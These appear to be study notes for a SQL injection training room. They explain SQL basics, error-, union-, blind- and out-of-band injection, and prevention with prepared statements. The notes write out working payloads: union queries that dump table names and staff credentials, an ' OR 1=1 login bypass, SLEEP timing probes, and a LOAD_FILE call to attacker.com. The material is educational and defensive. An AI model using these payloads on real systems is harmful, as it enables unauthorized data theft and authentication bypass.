# SQL Injection

## Task 1: Introduction to SQL Injection (SQLi)

- SQL Injection (SQLi) exploits improper input validation to execute malicious SQL queries.
- It can lead to data theft, modification, deletion, authentication bypass, and database compromise.
- One of the oldest and most dangerous web vulnerabilities.

### SQL Basics

- SQL (Structured Query Language) is used to manage relational databases.
- Relational databases store data in tables (rows & columns) with relationships.
- Common SQL operations:
  - INSERT → Add data
  - UPDATE → Modify data
  - DELETE → Remove data
  - SELECT → Retrieve data

---

## Task 2: What is a Database?

### Database Overview

- A database is an organized electronic storage system for data, managed by a Database Management System (DBMS).
- Two main types:
  - Relational Databases (SQL-based) → MySQL, SQL Server, PostgreSQL, SQLite.
  - Non-Relational Databases (NoSQL-based) → MongoDB, Cassandra, ElasticSearch.

### Database Structure

- A DBMS can manage multiple databases, each containing tables identified by unique names.

- Tables consist of:
  - Columns (Fields) → Define data type & constraints (e.g., unique, not null).
  - Rows (Records) → Contain actual data entries.

---

## Task 3: What is SQL?

### Retrieving Data with SELECT

- Get all columns:
  SQL Query => `SELECT * FROM users;`

- Get specific columns:
  SQL Query => `SELECT username, password FROM users;`

- Limit results:

  - SQL Query => `SELECT* FROM users LIMIT 1;`

- Filter results using WHERE:

  - SQL Query => `SELECT* FROM users WHERE username='admin';`

- Pattern matching with LIKE:

  - SQL Query => `SELECT* FROM users WHERE username LIKE 'a%';`

- Combining Queries with UNION
  - SQL Query => `SELECT name, address FROM customers UNION SELECT company, address FROM suppliers;``

### Modifying Data

- INSERT new data:

  - `SQL Query => INSERT INTO users (username, password) VALUES ('bob', 'password123');`

- UPDATE existing data:

  - `SQL Query => UPDATE users SET username='root' WHERE username='admin';`

- DELETE data:
  - `SQL Query => DELETE FROM users WHERE username='martin';`

---

## Task 4: What is SQL Injection?

- Occurs when user-provided data is inserted directly into an SQL query.

- Example scenario:

  - SQL Query => `SELECT * FROM blog WHERE id=1 AND private=0;`

    - Attacker modifies the URL: `https://website.thm/blog?id=2;-- -`

    - This terminates the query early and bypasses access controls.

---

## Task 5: In-Band SQL Injection

- Error-Based SQL Injection

  - Exploits errors returned by the database to extract information.
  - Example: Triggering an error by adding a single quote (') to an input field.

- Union-Based SQL Injection
  - Uses UNION SELECT to retrieve additional data.
  - Steps to determine the number of columns:
    SQL Query => `1 UNION SELECT 1,2,3; --` Increase numbers until no error appears.
  - Extracting database name:
    SQL Query => `0 UNION SELECT 1,2,database();`
  - Extracting table names:
    SQL Query => `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one';`
  - Extracting credentials:
    SQL Query => `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users;`

---

## Task 6: Blind SQL Injection - Authentication Bypass

- No visible error messages, but success can be inferred from application behavior.

- Bypassing Login Authentication:
  - SQL Query => ` ' OR 1=1;--`
  - Always evaluates to TRUE, granting access.

---

## Task 7 & 8: Blind SQL Injection - Boolean & Time-Based

- Boolean-Based SQLi

  - Responses change based on injected conditions.
  - Example:
    - SQL Query => `' AND 1=1 -- --` (Valid query, may return results)
    - SQL Query => `' AND 1=2 -- --` (Invalid query, no results)

- Time-Based SQLi
  - Uses `SLEEP()` to introduce delays.
  - If the response is delayed, the query executed successfully.
    - SQL Query => `' UNION SELECT SLEEP(5);--`

---

## Task 9: Out-of-Band SQL Injection

- Uses external communication (HTTP/DNS requests) to exfiltrate data.

- Example:
  - SQL Query => `SELECT LOAD_FILE('\\\\attacker.com\\payload');`
  - Forces the database to request a file from an external server.

---

## Task 10: SQL Injection Prevention

- Use Prepared Statements (Parameterized Queries)

  - Prevents SQL injection by treating user input as data, not part of the query.
    -PHP Code: - `$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();`

- Implement Input Validation

  - Allow only expected input types (e.g., numbers for IDs, predefined options for dropdowns).

- Escape User Input

  - Use built-in escaping functions to sanitize input.

- Restrict Database Permissions

  - Limit database user privileges to only necessary actions.

- Web Application Firewalls (WAFs)
  - Can help detect and block SQL Injection attacks.

---
